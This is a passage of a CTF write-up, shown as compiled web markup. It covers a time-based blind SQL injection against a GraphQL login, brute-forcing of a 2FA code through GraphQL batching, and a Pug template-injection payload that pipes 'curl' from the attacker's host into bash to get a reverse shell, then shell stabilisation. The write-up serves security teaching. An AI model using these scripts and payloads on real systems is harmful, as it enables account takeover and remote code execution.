string\",children:'\"*/*\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Origin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Referer\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194/admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Encoding\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"gzip, deflate\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Language\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"en-US,en;q=0.9\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Connection\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"close\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:`\"mutation {\\\\n    LoginUser(username: \\\\\"-12' or (select sleep(2) from dual where (SELECT username from users ) like '\"`}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"char\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`\"%')-- \\\\\", password: \\\\\"a\\\\\"){\\\\n        message,\\\\n        token    \\\\n}\\\\n}\"`}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#print(burp0_json)\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        start \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"perf_counter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"post\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"burp0_url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" headers\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_headers\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        request_time \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"perf_counter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` start\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token comment\",children:'#print(\"[Char: ]\"+char+\" \"+str(request_time))'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" request_time \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),`char\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"result: \"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"res\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"break\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"We run the script and we\\u2019re able to retrieve the username!\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp \\xBB python3 sql.py\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: J\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: Jo\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: Joh\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`result: John\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Just for the sake of the length of the writeup, we can use similar script to retrieve the MD5 of John user and crack it with \",(0,e.jsx)(n.a,{href:\"https://crackstation.net/\",children:\"Crackstation\"}),\" to get \",(0,e.jsx)(n.code,{children:\"iamcool\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Logging in with user \",(0,e.jsx)(n.code,{children:\"John:iamcool\"}),\" Works and we\\u2019re greeted with 2FA.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/otp-web.png\",alt:\"A screenshot of OTP verification form. OTP will be sent through email, and will expire in 2 minutes\"})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried to provide a random OTP to check the request and it\\u2019s a graphql query as well:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"verify2FA\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"otp\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"1234\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This GraphQL mutation queries a \",(0,e.jsx)(n.code,{children:\"verify2FA\"}),\" function with the provided one-time password (OTP). The function is expected to return a message and a token if the OTP is valid.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The first thing I tried was to bruteforce but there is a ratelimit implemented which makes it quite impossible as the the OTP expires after 2 minutes.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/rate-limit.png\",alt:\"A screenshot which shows that we\\u2019re being rate-limited\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Since we\\u2019re not able to bruteforce it, I tried using GraphQL Batching, which improves performance by reducing the number of round trips between the client and the server. However, if not properly implemented, it can also create vulnerabilities that can be exploited. In our case, we will send a batch request containing a mix of legitimate and malicious queries. The server processes the legitimate queries and returns the results to us. In simpler words, we will be attempting to exploit a vulnerability in a GraphQL server that allows batching of multiple queries in a single request.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will create a function that generates a GraphQL mutation containing multiple \",(0,e.jsx)(n.code,{children:\"verify2FA\"}),\" queries with different one-time password (OTP) values and constructs a GraphQL mutation containing these queries and returns it. This is needed because we won\\u2019t be able to send all the OTP values at once.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gen_payload\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" token \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"%04d\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"%\"}),\" I \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" I \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\"i\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"500\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        single \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'\\\\n    jaja'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"token\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`' : verify2FA(otp: \\\\\"'`}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"token\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`'\\\\\"){\\\\n        message,\\\\n        token    }\\\\n '`}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),`single\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'mutation {\\\\n   '\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"final\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'  \\\\n}'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),` payload\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then we just keep bruteforcing until we get a hit and get the new token.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` requests\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,e.jsx)(n.span,{className:\"token boolean\",children:\"True\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    session \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" requests\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_url \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194:80/graphql\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_cookies \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"session\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImpvaG4iLCJvdHBfdmVyaWZpY2F0aW9uIjpmYWxzZSwiaWF0IjoxNjcwMDIwMDYyLCJleHAiOjE2NzAwMjM2NjJ9.r624Ftvgxhuo7rNPeI1JeJpQzVTXON6cNpN0EAmABiE\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_headers \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"User-Agent\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Content-Type\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"application/json\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"*/*\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Origin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Referer\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194/admin/otp_verfification\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Encoding\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"gzip, deflate\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Language\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"en-US,en;q=0.9\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Connection\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"close\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    burp0_json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" gen_payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    rar \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"post\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"burp0_url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" headers\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_headers\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" cookies\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_cookies\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"burp0_json\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"text\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"token\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" rar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"text\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"hurray: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"break\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    i\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"500\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we just run the script until we get a hit:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/token-got.png\",alt:\"A screenshot that shows that we got a valid token\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we can use the new token to access the dashboard:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/dashboard-admin.png\",alt:\"A screenshot of the admin dashboard\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"In the \",(0,e.jsx)(n.code,{children:\"/admin/setting\"}),\" endpoint. We have a way to render a template!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-ssti-template.png\",alt:\"A screenshot of the admin templates section\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the first thing that comes in mind now is we find an SSTI. Knowing from the \",(0,e.jsx)(n.code,{children:\"Response Headers\"}),\" that we\\u2019re dealing with an Express nodejs server. I just tried a bunch of payloads \",(0,e.jsx)(n.code,{children:\"{{7*7}} ${7*7} #{7*7}\"}),\" And the \",(0,e.jsx)(n.code,{children:\"#{7*7}\"}),\" works.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/pugssti-template.png\",alt:\"A screenshot that shows the execution of pug ssti\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This means that we\\u2019re dealing with a \",(0,e.jsx)(n.code,{children:\"pug ssti\"}),\".  I\\u2019ll be using the following payload where I am hosting a bash reverse shell in my local webserver and piping into bash.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsx)(n.code,{className:\"language-js code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"#\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"function\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"localLoad\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"global\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"process\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"mainModule\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"constructor\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"_load\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"sh\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"localLoad\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"child_process\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"exec\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'curl 10.10.14.57 | bash'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"And I get a shell as john and grab the flag:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"listening on \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"any\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"connect to \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10.10\"}),\".14.57\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" from \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"UNKNOWN\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),\".228.37\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"44176\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"can't access \",(0,e.jsx)(n.span,{className:\"token function\",children:\"tty\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` job control turned off\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"id\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"cd\"}),` ~\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"cat\"}),` user.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STF22\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"g410f27d35f21325f47d83c375dedf32\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"First, I will stabilize my shell:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ python3 -c \",(0,e.jsx)(n.span,{className:\"token string\",children:`\"import pty;pty.spawn('/bin/bash')\"`}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@bautycare:~$\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  + \",(0,e.jsx)(n.span,{className:\"token number\",children:\"583791\"}),\" suspended  rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"443\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:/tmp \\xBB stty raw -echo\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token function\",children:\"fg\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  + \",(0,e.jsx)(n.span,{className:\"token number\",children:\"583791\"}),\" continued  rlwrap \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lvnp \",(0,e.jsx)(n.span,{className:\"token 